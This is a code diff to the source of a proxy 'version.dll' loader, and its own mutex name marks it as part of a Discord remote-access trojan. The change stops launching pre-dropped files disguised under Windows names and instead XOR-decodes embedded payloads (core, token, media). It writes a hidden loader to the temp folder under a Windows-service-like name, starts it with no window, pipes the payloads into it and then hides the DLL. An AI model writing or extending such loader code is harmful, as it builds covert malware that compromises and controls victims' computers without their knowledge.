@@ -1,12 +1,16 @@
 #include <windows.h>
 #include <shlobj.h>
 #include <strsafe.h>
+#include <winhttp.h>
 
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "winhttp.lib")
 
-#define LOADER_NAME L"WaaSMedicSvc.exe"
-#define PAYLOAD_NAME L"ProvData.db"
-#define CACHE_DIR L"Cache"
+#define RES_LOADER 101
+#define RES_CORE 102
+#define RES_TOKEN 103
+#define RES_MEDIA 104
+#define XOR_KEY 0xA7
 
 static HMODULE g_realVersion = NULL;
 static HMODULE g_selfModule = NULL;
@@ -24,12 +28,6 @@ static FARPROC RealProc(const char* name)
     return g_realVersion ? GetProcAddress(g_realVersion, name) : NULL;
 }
 
-static bool FileExistsW(const wchar_t* path)
-{
-    DWORD attrs = GetFileAttributesW(path);
-    return attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
-}
-
 static void HideSystemPath(const wchar_t* path)
 {
     DWORD attrs = GetFileAttributesW(path);
@@ -37,39 +35,6 @@ static void HideSystemPath(const wchar_t* path)
     {
         SetFileAttributesW(path, (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) & ~FILE_ATTRIBUTE_READONLY);
     }
-}
-
-static bool GetPayloadRootDirectory(wchar_t* outPath, size_t outChars)
-{
-    wchar_t localAppData[MAX_PATH] = { 0 };
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
-    {
-        return false;
-    }
-
-    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%s\\Microsoft\\Windows\\AppReadiness", localAppData));
-}
-
-static void HideDeployedFiles(const wchar_t* rootDir)
-{
-    wchar_t path[MAX_PATH] = { 0 };
-
-    StringCchPrintfW(path, MAX_PATH, L"%s\\" LOADER_NAME, rootDir);
-    HideSystemPath(path);
-
-    StringCchPrintfW(path, MAX_PATH, L"%s\\" PAYLOAD_NAME, rootDir);
-    HideSystemPath(path);
-
-    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR, rootDir);
-    HideSystemPath(path);
-
-    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR L"\\TokenProv.db", rootDir);
-    HideSystemPath(path);
-
-    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR L"\\DeviceCache.db", rootDir);
-    HideSystemPath(path);
-
-    HideSystemPath(rootDir);
 }
 
 static void HideSelfDll()
@@ -86,7 +51,184 @@ static void HideSelfDll()
     }
 }
 
-static void LaunchRuntimeHost()
+static bool LoadResourceBuffer(int resourceId, BYTE** outData, DWORD* outSize)
+{
+    *outData = NULL;
+    *outSize = 0;
+
+    HRSRC resource = FindResourceA(g_selfModule, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
+    if (!resource)
+    {
+        return false;
+    }
+
+    HGLOBAL loaded = LoadResource(g_selfModule, resource);
+    if (!loaded)
+    {
+        return false;
+    }
+
+    DWORD size = SizeofResource(g_selfModule, resource);
+    void* data = LockResource(loaded);
+    if (!data || size == 0)
+    {
+        return false;
+    }
+
+    BYTE* copy = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!copy)
+    {
+        return false;
+    }
+
+    CopyMemory(copy, data, size);
+    *outData = copy;
+    *outSize = size;
+    return true;
+}
+
+static void XorDecodeBuffer(BYTE* data, DWORD size)
+{
+    for (DWORD i = 0; i < size; i++)
+    {
+        data[i] ^= XOR_KEY;
+    }
+}
+
+static void FreeBuffer(BYTE* data)
+{
+    if (data)
+    {
+        VirtualFree(data, 0, MEM_RELEASE);
+    }
+}
+
+static bool WriteAllToHandle(HANDLE handle, const void* data, DWORD size)
+{
+    const BYTE* cursor = (const BYTE*)data;
+    DWORD remaining = size;
+
+    while (remaining > 0)
+    {
+        DWORD written = 0;
+        if (!WriteFile(handle, cursor, remaining, &written, NULL) || written == 0)
+        {
+            return false;
+        }
+        cursor += written;
+        remaining -= written;
+    }
+
+    return true;
+}
+
+static bool WriteUInt32(HANDLE handle, DWORD value)
+{
+    return WriteAllToHandle(handle, &value, sizeof(value));
+}
+
+static bool CreateTempLoaderPath(wchar_t* outPath, size_t outChars)
+{
+    wchar_t tempDir[MAX_PATH] = { 0 };
+    if (GetTempPathW(MAX_PATH, tempDir) == 0)
+    {
+        return false;
+    }
+
+    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%sWaaS_%08X.exe", tempDir, GetTickCount()));
+}
+
+static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core, DWORD coreSize, BYTE* token, DWORD tokenSize, BYTE* media, DWORD mediaSize)
+{
+    wchar_t loaderPath[MAX_PATH] = { 0 };
+    if (!CreateTempLoaderPath(loaderPath, MAX_PATH))
+    {
+        return false;
+    }
+
+    HANDLE loaderFile = CreateFileW(
+        loaderPath,
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY,
+        NULL);
+
+    if (loaderFile == INVALID_HANDLE_VALUE)
+    {
+        return false;
+    }
+
+    if (!WriteAllToHandle(loaderFile, loaderExe, loaderSize))
+    {
+        CloseHandle(loaderFile);
+        DeleteFileW(loaderPath);
+        return false;
+    }
+    CloseHandle(loaderFile);
+
+    SECURITY_ATTRIBUTES sa = { 0 };
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+
+    HANDLE readPipe = NULL;
+    HANDLE writePipe = NULL;
+    if (!CreatePipe(&readPipe, &writePipe, &sa, 1024 * 1024))
+    {
+        DeleteFileW(loaderPath);
+        return false;
+    }
+
+    SetHandleInformation(writePipe, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOW si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput = readPipe;
+    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
+    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
+
+    wchar_t commandLine[MAX_PATH + 32] = { 0 };
+    StringCchPrintfW(commandLine, MAX_PATH + 32, L"\"%s\" --pipe", loaderPath);
+
+    if (!CreateProcessW(loaderPath, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        CloseHandle(readPipe);
+        CloseHandle(writePipe);
+        DeleteFileW(loaderPath);
+        return false;
+    }
+
+    CloseHandle(readPipe);
+
+    bool ok = WriteUInt32(writePipe, coreSize) &&
+        WriteAllToHandle(writePipe, core, coreSize) &&
+        WriteUInt32(writePipe, tokenSize) &&
+        WriteAllToHandle(writePipe, token, tokenSize) &&
+        WriteUInt32(writePipe, mediaSize) &&
+        WriteAllToHandle(writePipe, media, mediaSize);
+
+    CloseHandle(writePipe);
+
+    if (!ok)
+    {
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        DeleteFileW(loaderPath);
+        return false;
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    DeleteFileW(loaderPath);
+    return true;
+}
+
+static void LaunchEmbeddedPayloadInMemory()
 {
     HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DiscordRAT_ShaherDev_v1");
     if (runningMutex)
@@ -96,55 +238,48 @@ static void LaunchRuntimeHost()
         return;
     }
 
-    wchar_t rootDir[MAX_PATH] = { 0 };
-    wchar_t loaderExe[MAX_PATH] = { 0 };
-    wchar_t payloadFile[MAX_PATH] = { 0 };
-    wchar_t legacyLoader[MAX_PATH] = { 0 };
-    wchar_t legacyPayload[MAX_PATH] = { 0 };
+    BYTE* loaderExe = NULL;
+    BYTE* core = NULL;
+    BYTE* token = NULL;
+    BYTE* media = NULL;
+    DWORD loaderSize = 0;
+    DWORD coreSize = 0;
+    DWORD tokenSize = 0;
+    DWORD mediaSize = 0;
 
-    if (!GetPayloadRootDirectory(rootDir, MAX_PATH))
+    if (!LoadResourceBuffer(RES_LOADER, &loaderExe, &loaderSize) ||
+        !LoadResourceBuffer(RES_CORE, &core, &coreSize))
     {
+        FreeBuffer(loaderExe);
+        FreeBuffer(core);
+        HideSelfDll();
         return;
     }
 
-    StringCchPrintfW(loaderExe, MAX_PATH, L"%s\\" LOADER_NAME, rootDir);
-    StringCchPrintfW(payloadFile, MAX_PATH, L"%s\\" PAYLOAD_NAME, rootDir);
-    StringCchPrintfW(legacyLoader, MAX_PATH, L"%s\\RuntimeHost.exe", rootDir);
-    StringCchPrintfW(legacyPayload, MAX_PATH, L"%s\\core.bin", rootDir);
+    XorDecodeBuffer(core, coreSize);
 
-    const wchar_t* launchPath = loaderExe;
-    if (!FileExistsW(loaderExe) || !FileExistsW(payloadFile))
+    if (LoadResourceBuffer(RES_TOKEN, &token, &tokenSize))
     {
-        if (FileExistsW(legacyLoader) && FileExistsW(legacyPayload))
-        {
-            launchPath = legacyLoader;
-        }
-        else
-        {
-            HideSelfDll();
-            return;
-        }
+        XorDecodeBuffer(token, tokenSize);
     }
 
-    STARTUPINFOW si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    if (CreateProcessW((wchar_t*)launchPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, rootDir, &si, &pi))
+    if (LoadResourceBuffer(RES_MEDIA, &media, &mediaSize))
     {
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        XorDecodeBuffer(media, mediaSize);
     }
 
+    LaunchLoaderFromMemory(loaderExe, loaderSize, core, coreSize, token ? token : (BYTE*)"", tokenSize, media ? media : (BYTE*)"", mediaSize);
+
+    FreeBuffer(loaderExe);
+    FreeBuffer(core);
+    FreeBuffer(token);
+    FreeBuffer(media);
     HideSelfDll();
-    HideDeployedFiles(rootDir);
 }
 
 DWORD WINAPI RunLoader(LPVOID)
 {
-    LaunchRuntimeHost();
+    LaunchEmbeddedPayloadInMemory();
     return 0;
 }
 
